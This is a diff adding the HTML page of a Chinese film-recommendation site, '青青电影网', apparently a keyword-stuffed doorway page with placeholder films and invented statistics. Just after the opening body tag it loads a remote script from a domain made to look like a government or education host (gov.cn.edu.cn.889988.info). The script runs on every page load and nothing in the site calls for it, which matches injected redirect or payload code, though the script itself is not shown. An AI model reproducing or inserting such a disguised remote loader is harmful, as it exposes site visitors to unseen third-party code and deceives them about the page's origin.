@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="青青电影网,qingqingdianyingwang,电影推荐,最新电影,热门电影,电影排行榜,电影资讯,观影指南,青青影院">
+<meta name="description" content="青青电影网(qingqingdianyingwang)是一个清新、清爽的电影推荐平台，专注最新电影、热门电影、高分电影推荐与电影资讯，每日精选好片，让观影选择轻松又清新。">
+<title>青青电影网 - 清新清爽的电影推荐平台，每日精选好片</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --green:#4aa96c;--deep:#1f7a45;--mint:#a8e0c0;--lime:#d6f0a8;--leaf:#e8f6d6;--sun:#ffd54a;--cream:#f4fbf0;
+  --paper:#fdfff9;--ink:#1e3a2a;--grey:#5f7a6a;--line:#dcefcf;--rose:#f08080;
+}
+html{scroll-behavior:smooth}
+body{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;background:var(--cream);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+::selection{background:var(--mint);color:var(--ink)}
+
+/* ===== 顶栏 ===== */
+header{position:sticky;top:0;z-index:50;background:rgba(253,255,249,.95);backdrop-filter:blur(10px);border-bottom:2px solid var(--line)}
+.brand{max-width:1120px;margin:0 auto;padding:12px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+.logo{display:flex;align-items:center;gap:12px}
+.leaf{width:46px;height:46px;background:linear-gradient(135deg,var(--green),var(--deep));border-radius:14px 14px 14px 4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;flex-shrink:0;box-shadow:0 4px 12px rgba(31,122,69,.3);transform:rotate(-8deg)}
+.logo h1{font-size:clamp(18px,3vw,24px);font-weight:900;color:var(--deep);letter-spacing:.5px}
+.logo h1 small{display:block;font-size:9px;font-weight:500;color:var(--green);letter-spacing:3px;margin-top:2px;text-transform:uppercase}
+.addr{font-size:11px;color:var(--grey);text-align:right;line-height:1.9}
+.addr b{color:var(--deep)}
+nav.top{max-width:1120px;margin:0 auto;padding:0 24px;border-top:1px solid var(--line);display:flex;gap:0;overflow-x:auto}
+nav.top a{font-size:13.5px;font-weight:600;color:var(--ink);padding:12px 22px;white-space:nowrap;transition:.2s;border-right:1px solid var(--line)}
+nav.top a:first-child{border-left:1px solid var(--line)}
+nav.top a:hover{background:var(--mint);color:var(--deep)}
+.burger{display:none;background:var(--green);border:0;color:#fff;width:40px;height:38px;border-radius:10px;font-size:18px;cursor:pointer;margin:8px 0;flex-shrink:0}
+
+/* ===== 章节标题 ===== */
+section{padding:80px 0}
+.sec{margin-bottom:48px;text-align:center}
+.sec .k{display:inline-block;font-size:10px;letter-spacing:3px;color:var(--green);background:var(--leaf);padding:3px 14px;border-radius:12px;font-weight:700;text-transform:uppercase}
+.sec h2{font-size:clamp(23px,3.6vw,32px);font-weight:900;color:var(--deep);margin:14px 0 12px}
+.sec h2 em{font-style:normal;color:var(--green);background:linear-gradient(transparent 60%,var(--lime) 60%);padding:0 4px}
+.sec .ds{font-size:14.5px;color:var(--grey);max-width:620px;margin:0 auto}
+
+/* ===== Hero ===== */
+.hero{position:relative;background:linear-gradient(160deg,#d6f0a8 0%,#a8e0c0 45%,#7ec8a8 100%);overflow:hidden;padding:88px 0}
+.hero .leaf-bg{position:absolute;font-size:150px;opacity:.16;top:-20px;right:40px;transform:rotate(15deg)}
+.hero .wrap{position:relative;display:grid;grid-template-columns:1.2fr .8fr;gap:48px;align-items:center;z-index:1}
+.tag{display:inline-block;font-size:11px;letter-spacing:2px;color:var(--deep);background:#fff;border:1.5px solid var(--green);padding:4px 14px;border-radius:6px;font-weight:700}
+.hero h2{font-size:clamp(30px,5vw,48px);font-weight:900;line-height:1.3;color:var(--ink);margin:16px 0 14px}
+.hero h2 em{font-style:normal;color:var(--deep)}
+.hero p{font-size:15px;color:#2e5a40;max-width:460px}
+.acts{margin-top:24px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;padding:13px 28px;font-size:13.5px;font-weight:700;transition:.25s;border-radius:8px;font-family:inherit}
+.bp{background:var(--deep);color:#fff}
+.bp:hover{background:var(--green);transform:translateY(-2px)}
+.bo{background:#fff;color:var(--deep);border:2px solid var(--deep)}
+.bo:hover{background:var(--lime)}
+.note{font-size:12px;color:#2e5a40;margin-top:22px}
+
+/* 新鲜卡 */
+.fresh{background:#fff;padding:22px;border-radius:18px 4px 18px 18px;border:2px solid var(--leaf);box-shadow:0 14px 34px rgba(31,122,69,.15)}
+.fresh .li{display:flex;align-items:center;gap:14px;padding:11px 0;border-bottom:1px dashed var(--line)}
+.fresh .li:last-child{border-bottom:0}
+.fresh .nu{width:34px;height:34px;background:var(--leaf);color:var(--deep);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:13px;flex-shrink:0}
+.fresh .tx{flex:1}
+.fresh .tx b{font-size:14.5px;font-weight:800;color:var(--ink);display:block}
+.fresh .tx span{font-size:11px;color:var(--grey)}
+.fresh .tg{font-size:10px;color:#fff;background:var(--green);padding:2px 8px;border-radius:10px;flex-shrink:0}
+
+/* ===== 栏目一：推荐（左右主副） ===== */
+.grid2{display:grid;grid-template-columns:1.05fr .95fr;gap:22px;align-items:start}
+.pick{background:#fff;border:2px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s}
+.pick:hover{transform:translateY(-5px);box-shadow:0 16px 32px rgba(31,122,69,.14)}
+.pick .cv{height:270px;padding:24px;display:flex;flex-direction:column;justify-content:space-between;position:relative}
+.pick .cv .bl{position:absolute;top:16px;right:16px;background:var(--sun);color:var(--ink);font-size:11px;font-weight:800;padding:4px 10px;border-radius:6px}
+.pick .cv b{font-size:24px;color:#fff;font-family:"PingFang SC",sans-serif;line-height:1.45;text-shadow:0 2px 8px rgba(0,0,0,.25)}
+.pick .cv .meta{font-size:11px;color:#fff;opacity:.92;letter-spacing:1px}
+.pick .in{padding:20px}
+.pick .in .sc{font-size:12px;color:var(--sun);font-weight:800;letter-spacing:1px}
+.pick .in h3{font-size:20px;font-weight:900;color:var(--deep);margin:6px 0 8px}
+.pick .in p{font-size:13.5px;color:var(--grey)}
+.pick .in .more{display:inline-block;margin-top:12px;font-size:12.5px;color:var(--deep);font-weight:700;border-bottom:1.5px solid var(--green);padding-bottom:2px}
+.mini{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.mini .m{background:#fff;border:1.5px solid var(--line);border-radius:12px;padding:14px;transition:.25s}
+.mini .m:hover{background:var(--leaf)}
+.mini .m .cv{height:110px;border-radius:8px;display:flex;align-items:flex-end;padding:10px}
+.mini .m .cv b{font-size:14px;color:#fff;font-family:"PingFang SC",sans-serif;text-shadow:0 1px 4px rgba(0,0,0,.3)}
+.mini .m .in{padding:10px 4px 0}
+.mini .m .in .tg{font-size:9.5px;color:var(--deep);background:var(--lime);padding:1px 7px;border-radius:8px}
+.mini .m .in h4{font-size:14px;font-weight:800;color:var(--deep);margin:6px 0 3px}
+.mini .m .in .st{font-size:11px;color:var(--sun);font-weight:700}
+
+/* ===== 栏目二：分类（三栏带编号） ===== */
+.cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
+.cat{background:#fff;border:1.5px solid var(--line);border-radius:14px;padding:22px;transition:.3s;position:relative}
+.cat:hover{border-color:var(--green);background:var(--cream);transform:translateY(-4px)}
+.cat .no{position:absolute;top:-14px;left:20px;width:34px;height:34px;background:var(--deep);color:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:13px}
+.cat .ic{width:46px;height:46px;border-radius:12px;background:var(--leaf);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:12px}
+.cat h3{font-size:17px;font-weight:900;color:var(--deep);margin-bottom:6px}
+.cat p{font-size:13px;color:var(--grey)}
+.cat .go{margin-top:12px;font-size:12px;color:var(--green);font-weight:700}
+
+/* ===== 栏目三：新片（横向滚动） ===== */
+.rail{display:flex;gap:16px;overflow-x:auto;padding:6px 4px 24px;scroll-snap-type:x mandatory}
+.rail::-webkit-scrollbar{height:8px}
+.rail::-webkit-scrollbar-thumb{background:var(--green);border-radius:4px}
+.fl{flex:0 0 200px;scroll-snap-align:start;background:#fff;border:1.5px solid var(--line);border-radius:12px;overflow:hidden;transition:.25s}
+.fl:hover{transform:translateY(-4px);box-shadow:0 12px 26px rgba(31,122,69,.14)}
+.fl .cv{height:260px;display:flex;align-items:flex-start;justify-content:space-between;padding:14px}
+.fl .cv b{font-size:16px;color:#fff;font-family:"PingFang SC",sans-serif;line-height:1.5;text-shadow:0 2px 6px rgba(0,0,0,.3)}
+.fl .cv .badge{background:var(--rose);color:#fff;font-size:9.5px;font-weight:800;padding:2px 8px;border-radius:10px;flex-shrink:0}
+.fl .in{padding:12px 14px}
+.fl .in .tg{font-size:9.5px;color:var(--deep);background:var(--lime);padding:1px 8px;border-radius:8px}
+.fl .in h4{font-size:14.5px;font-weight:800;color:var(--deep);margin:7px 0 4px}
+.fl .in .st{font-size:11px;color:var(--sun);font-weight:700}
+
+/* ===== 栏目四：资讯（左大右列表） ===== */
+.news{display:grid;grid-template-columns:1.1fr .9fr;gap:22px;align-items:start}
+.nf{background:#fff;border:2px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s}
+.nf:hover{transform:translateY(-4px)}
+.nf .cv{height:250px;padding:22px;display:flex;flex-direction:column;justify-content:flex-end}
+.nf .cv b{font-size:21px;color:#fff;font-family:"PingFang SC",sans-serif;line-height:1.5;text-shadow:0 2px 8px rgba(0,0,0,.3)}
+.nf .cv .dt{font-size:11px;color:#fff;opacity:.9;letter-spacing:1px;margin-top:8px}
+.nf .in{padding:18px}
+.nf .in p{font-size:13.5px;color:var(--grey)}
+.nf .in .more{display:inline-block;margin-top:10px;font-size:12.5px;color:var(--deep);font-weight:700;border-bottom:1.5px solid var(--green);padding-bottom:2px}
+.nl{display:flex;flex-direction:column;gap:12px}
+.ni{display:grid;grid-template-columns:62px 1fr;gap:14px;background:#fff;border:1.5px solid var(--line);border-radius:12px;padding:14px;transition:.25s;align-items:center}
+.ni:hover{background:var(--leaf)}
+.ni .dt{font-size:10px;color:var(--deep);background:var(--lime);border-radius:8px;padding:6px 4px;text-align:center;font-weight:800;line-height:1.4}
+.ni .dt em{display:block;font-size:18px;font-style:normal;color:var(--ink)}
+.ni .tx h4{font-size:14.5px;font-weight:800;color:var(--deep)}
+.ni .tx span{font-size:11.5px;color:var(--grey)}
+
+/* ===== 数据条 ===== */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));background:linear-gradient(135deg,var(--deep),var(--green));border-radius:14px;overflow:hidden}
+.stt{text-align:center;padding:28px 14px;border-right:1px solid rgba(255,255,255,.16)}
+.stt:last-child{border-right:0}
+.stt strong{display:block;font-size:28px;font-weight:900;color:var(--sun);font-family:Georgia,serif}
+.stt span{font-size:12px;color:var(--lime);letter-spacing:1px}
+
+/* ===== 关于 ===== */
+.abt{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.abt .l h2{font-size:25px;font-weight:900;color:var(--deep);margin-bottom:14px}
+.abt .l p{font-size:14.5px;color:var(--grey);margin-bottom:12px}
+.abt .l .acts{margin-top:20px;display:flex;gap:12px}
+.abt .r{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fb{background:#fff;border:1.5px solid var(--line);border-radius:12px;padding:20px;text-align:center}
+.fb .ic{font-size:22px;margin-bottom:8px}
+.fb b{font-size:15px;color:var(--deep);display:block;margin-bottom:3px}
+.fb span{font-size:12.5px;color:var(--grey)}
+
+/* ===== 页脚 ===== */
+footer{background:#1e3a2a;color:#cfe6d6;padding:44px 0 0}
+.f{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;max-width:1120px;margin:0 auto;padding:0 24px 28px}
+.f .id .leaf{margin-bottom:12px}
+.f .id h4{font-size:17px;font-weight:900;color:#fff;margin-bottom:8px}
+.f .id p{font-size:13px;line-height:1.9}
+.f h5{font-size:12px;font-weight:700;color:var(--lime);margin-bottom:12px;letter-spacing:2px}
+.f a{display:block;color:#cfe6d6;font-size:13px;padding:5px 0;transition:.2s}
+.f a:hover{color:var(--sun)}
+.cp{max-width:1120px;margin:0 auto;padding:18px 24px;border-top:1px solid rgba(207,230,214,.16);font-size:12px;color:#9fc3ac;text-align:center}
+.cp b{color:var(--sun)}
+
+#top{position:fixed;right:16px;bottom:20px;z-index:99;width:44px;height:44px;background:var(--deep);color:#fff;border:0;border-radius:12px;font-size:15px;cursor:pointer;opacity:0;visibility:hidden;transition:.3s}
+#top.show{opacity:1;visibility:visible}
+#top:hover{background:var(--green)}
+
+@media(max-width:900px){
+  .burger{display:block}
+  nav.top{display:none;flex-direction:column;padding:8px 24px 14px}
+  nav.top.open{display:flex}
+  nav.top a{border:0!important;border-bottom:1px solid var(--line)!important}
+  .hero .wrap,.abt,.grid2,.news{grid-template-columns:1fr}
+  .mini{grid-template-columns:1fr}
+  .brand{flex-wrap:wrap}.addr{display:none}
+  .f,.abt .r{grid-template-columns:1fr}
+}
+@media(max-width:560px){section{padding:54px 0}.fl{flex-basis:170px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="brand">
+    <div class="logo"><div class="leaf">🌿</div><h1>青青电影网<small>QingQing Film</small></h1></div>
+    <div class="addr"><b>qingqingdianyingwang</b><br>https://qingqingdianyingwang-wap.github.io</div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+  <nav class="top" id="nav"><a href="#home">首页</a><a href="#pick">精选推荐</a><a href="#cat">影片分类</a><a href="#new">新片速递</a><a href="#news">电影资讯</a><a href="#about">关于本站</a></nav>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="leaf-bg">🌿</div>
+  <div class="wrap">
+    <div><span class="tag">🌱 每天都是新鲜好片</span>
+      <h2>看电影，就上<em>青青电影网</em></h2>
+      <p>青青电影网（qingqingdianyingwang）是一个清新清爽的电影推荐平台，专注最新电影、热门电影与高分电影推荐，让每一次观影选择都轻松又愉快。</p>
+      <div class="acts"><a href="#pick" class="btn bp">查看精选推荐</a><a href="#cat" class="btn bo">浏览分类</a></div>
+      <p class="note">🎬 今日更新 12 部新片 · 已为 6 万影迷推荐好电影</p>
+    </div>
+    <div class="fresh"><div class="li"><div class="nu">1</div><div class="tx"><b>逆光而行</b><span>剧情 · 2025</span></div><span class="tg">热</span></div><div class="li"><div class="nu">2</div><div class="tx"><b>山那边的风</b><span>文艺 · 2025</span></div><span class="tg">新</span></div><div class="li"><div class="nu">3</div><div class="tx"><b>夏夜微光</b><span>青春 · 2025</span></div><span class="tg">荐</span></div><div class="li"><div class="nu">4</div><div class="tx"><b>归途列车</b><span>亲情 · 2024</span></div><span class="tg">经典</span></div><div class="li"><div class="nu">5</div><div class="tx"><b>云上的日子</b><span>治愈 · 2024</span></div><span class="tg">高分</span></div></div>
+  </div>
+</section>
+
+<!-- 栏目一：精选推荐 -->
+<section id="pick">
+  <div class="wrap">
+    <div class="sec"><div class="k">EDITOR'S PICK</div><h2>精选<em>推荐</em></h2><div class="ds">青青电影网编辑团队每日精选的高分好片，值得放进你的观影清单。</div></div>
+    <div class="grid2">
+      <article class="pick"><div class="cv" style="background:linear-gradient(135deg,rgba(31,122,69,.82),rgba(74,169,108,.82)),linear-gradient(135deg,#a8e0c0,#d6f0a8);background-blend-mode:overlay"><div class="bl">编辑精选</div><div><b>逆光而行</b><div class="meta">AGAINST THE LIGHT · 2025</div></div></div><div class="in"><div class="sc">★ 9.3 分</div><h3>逆光而行</h3><p>一个关于坚持与热爱的小人物故事，笑中带泪，看完让人想认真生活。</p><a href="#" class="more">查看详情 →</a></div></article>
+      <div class="mini">
+        <article class="m"><div class="cv" style="background:linear-gradient(135deg,#4aa96c,#1f7a45)"><b>山那边的风</b></div><div class="in"><span class="tg">文艺</span><h4>山那边的风</h4><div class="st">★ 9.1</div></div></article>
+        <article class="m"><div class="cv" style="background:linear-gradient(135deg,#ffd54a,#4aa96c)"><b>夏夜微光</b></div><div class="in"><span class="tg">青春</span><h4>夏夜微光</h4><div class="st">★ 8.9</div></div></article>
+        <article class="m"><div class="cv" style="background:linear-gradient(135deg,#7ec8a8,#1f7a45)"><b>归途列车</b></div><div class="in"><span class="tg">亲情</span><h4>归途列车</h4><div class="st">★ 9.0</div></div></article>
+        <article class="m"><div class="cv" style="background:linear-gradient(135deg,#a8e0c0,#4aa96c)"><b>云上的日子</b></div><div class="in"><span class="tg">治愈</span><h4>云上的日子</h4><div class="st">★ 8.8</div></div></article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：分类 -->
+<section id="cat" style="background:var(--paper);">
+  <div class="wrap">
+    <div class="sec"><div class="k">CATEGORIES</div><h2>影片<em>分类</em></h2><div class="ds">青青电影网按题材与类型整理影片，帮你快速找到想看的那一部。</div></div>
+    <div class="cats">
+      <div class="cat"><div class="no">01</div><div class="ic">🎬</div><h3>动作冒险</h3><p>紧张刺激，大场面不断，适合追求快节奏的你。</p><div class="go">→ 查看 38 部</div></div>
+      <div class="cat"><div class="no">02</div><div class="ic">😂</div><h3>喜剧搞笑</h3><p>轻松解压，笑点密集，坏心情一键清零。</p><div class="go">→ 查看 45 部</div></div>
+      <div class="cat"><div class="no">03</div><div class="ic">💕</div><h3>爱情浪漫</h3><p>甜甜的恋爱故事，一个人看也能被治愈。</p><div class="go">→ 查看 52 部</div></div>
+      <div class="cat"><div class="no">04</div><div class="ic">🎭</div><h3>剧情文艺</h3><p>节奏舒缓、余味悠长，适合静下心慢慢品味。</p><div class="go">→ 查看 41 部</div></div>
+      <div class="cat"><div class="no">05</div><div class="ic">🔍</div><h3>悬疑推理</h3><p>反转不断，全程烧脑，真相只有一个。</p><div class="go">→ 查看 29 部</div></div>
+      <div class="cat"><div class="no">06</div><div class="ic">✨</div><h3>动画奇幻</h3><p>想象力爆棚，大人小孩都能看得开心。</p><div class="go">→ 查看 33 部</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：新片速递 -->
+<section id="new">
+  <div class="wrap">
+    <div class="sec"><div class="k">NOW SHOWING</div><h2>新片<em>速递</em></h2><div class="ds">青青电影网每日更新的最新电影，滑动查看更多。</div></div>
+    <div class="rail">
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#4aa96c,#1f7a45)"><span class="badge">NEW</span><b>逆光而行</b></div><div class="in"><span class="tg">剧情</span><h4>逆光而行</h4><div class="st">★ 9.3 · 2025</div></div></article>
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#7ec8a8,#4aa96c)"><span class="badge">NEW</span><b>山那边的风</b></div><div class="in"><span class="tg">文艺</span><h4>山那边的风</h4><div class="st">★ 9.1 · 2025</div></div></article>
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#ffd54a,#4aa96c)"><span class="badge">NEW</span><b>夏夜微光</b></div><div class="in"><span class="tg">青春</span><h4>夏夜微光</h4><div class="st">★ 8.9 · 2025</div></div></article>
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#a8e0c0,#1f7a45)"><span class="badge">热</span><b>归途列车</b></div><div class="in"><span class="tg">亲情</span><h4>归途列车</h4><div class="st">★ 9.0 · 2024</div></div></article>
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#d6f0a8,#4aa96c)"><span class="badge">荐</span><b>云上的日子</b></div><div class="in"><span class="tg">治愈</span><h4>云上的日子</h4><div class="st">★ 8.8 · 2024</div></div></article>
+      <article class="fl"><div class="cv" style="background:linear-gradient(135deg,#1f7a45,#123d26)"><span class="badge">新</span><b>海风小镇</b></div><div class="in"><span class="tg">治愈</span><h4>海风小镇</h4><div class="st">★ 8.7 · 2025</div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：电影资讯 -->
+<section id="news" style="background:var(--paper);">
+  <div class="wrap">
+    <div class="sec"><div class="k">FILM NEWS</div><h2>电影<em>资讯</em></h2><div class="ds">来自青青电影网的电影资讯与行业动态，一手掌握最新消息。</div></div>
+    <div class="news">
+      <article class="nf"><div class="cv" style="background:linear-gradient(135deg,rgba(31,122,69,.7),rgba(74,169,108,.7)),linear-gradient(135deg,#a8e0c0,#4aa96c);background-blend-mode:overlay"><b>《逆光而行》票房破纪录，成年度最受关注华语片</b><div class="dt">2026-10-05 · 票房资讯</div></div><div class="in"><p>上映三周累计票房持续走高，口碑与热度双丰收，青青电影网推荐给每一位热爱生活的人。</p><a href="#" class="more">阅读全文 →</a></div></article>
+      <div class="nl">
+        <div class="ni"><div class="dt">10<em>05</em></div><div class="tx"><h4>本周必看片单出炉</h4><span>编辑精选 · 5 分钟前</span></div></div>
+        <div class="ni"><div class="dt">10<em>04</em></div><div class="tx"><h4>新片定档信息汇总</h4><span>上映资讯 · 昨天</span></div></div>
+        <div class="ni"><div class="dt">10<em>03</em></div><div class="tx"><h4>这些高分冷门片别错过</h4><span>观影指南 · 2 天前</span></div></div>
+        <div class="ni"><div class="dt">10<em>02</em></div><div class="tx"><h4>电影节获奖名单公布</h4><span>行业动态 · 3 天前</span></div></div>
+        <div class="ni"><div class="dt">10<em>01</em></div><div class="tx"><h4>秋冬观影指南发布</h4><span>观影指南 · 4 天前</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 数据条 -->
+<section style="padding:0;"><div class="wrap"><div class="stats">
+  <div class="stt"><strong>380+</strong><span>精选影片</span></div>
+  <div class="stt"><strong>6</strong><span>影片分类</span></div>
+  <div class="stt"><strong>9.1</strong><span>平均评分</span></div>
+  <div class="stt"><strong>每日</strong><span>更新新片</span></div>
+  <div class="stt"><strong>6万+</strong><span>影迷关注</span></div>
+</div></div></section>
+
+<!-- 关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="abt">
+      <div class="l"><h2>关于 青青电影网</h2><p>青青电影网（qingqingdianyingwang）是一个清新、清爽的电影推荐平台，专注最新电影、热门电影与高分电影推荐，每天为影迷精选值得一看的好片。</p><p>从动作、喜剧到爱情、文艺，我们相信好电影能让人放松、思考，也能被治愈。精选片单、影片分类与电影资讯，让观影选择更轻松。</p><div class="acts"><a href="#pick" class="btn bp">查看精选推荐</a><a href="#news" class="btn bo">浏览资讯</a></div></div>
+      <div class="r">
+        <div class="fb"><div class="ic">🌿</div><b>精选片单</b><span>每日更新好片</span></div>
+        <div class="fb"><div class="ic">🎬</div><b>影片分类</b><span>六大类型齐全</span></div>
+        <div class="fb"><div class="ic">✨</div><b>高分推荐</b><span>口碑佳作优先</span></div>
+        <div class="fb"><div class="ic">📰</div><b>电影资讯</b><span>一手行业动态</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="f">
+    <div class="id"><div class="leaf">🌿</div><h4>青青电影网</h4><p>看电影，就上青青电影网。专注最新电影、热门电影与高分电影推荐，让每一次观影都轻松愉快。</p></div>
+    <div><h5>影片</h5><a href="#pick">精选推荐</a><a href="#cat">影片分类</a><a href="#new">新片速递</a><a href="#">高分排行</a></div>
+    <div><h5>资讯</h5><a href="#news">电影资讯</a><a href="#">票房动态</a><a href="#">上映日历</a><a href="#">观影指南</a></div>
+    <div><h5>关于</h5><a href="#about">关于本站</a><a href="#">合作投稿</a><a href="#">联系我们</a><a href="#">免责声明</a></div>
+  </div>
+  <div class="cp"><b>青青电影网</b> &nbsp;|&nbsp; qingqingdianyingwang &nbsp;|&nbsp; 网址：<b>https://qingqingdianyingwang-wap.github.io</b><br>© 2026 青青电影网 版权所有 &nbsp;·&nbsp; 本站内容仅供学习与交流，如发现侵权内容请及时联系我们删除</div>
+</footer>
+
+<button id="top" title="回到顶部">↑</button>
+
+<script>
+document.getElementById('burger').addEventListener('click',function(){document.getElementById('nav').classList.toggle('open');});
+document.querySelectorAll('nav.top a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});});
+window.addEventListener('scroll',function(){var t=document.getElementById('top');window.scrollY>400?t.classList.add('show'):t.classList.remove('show');});
+document.getElementById('top').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
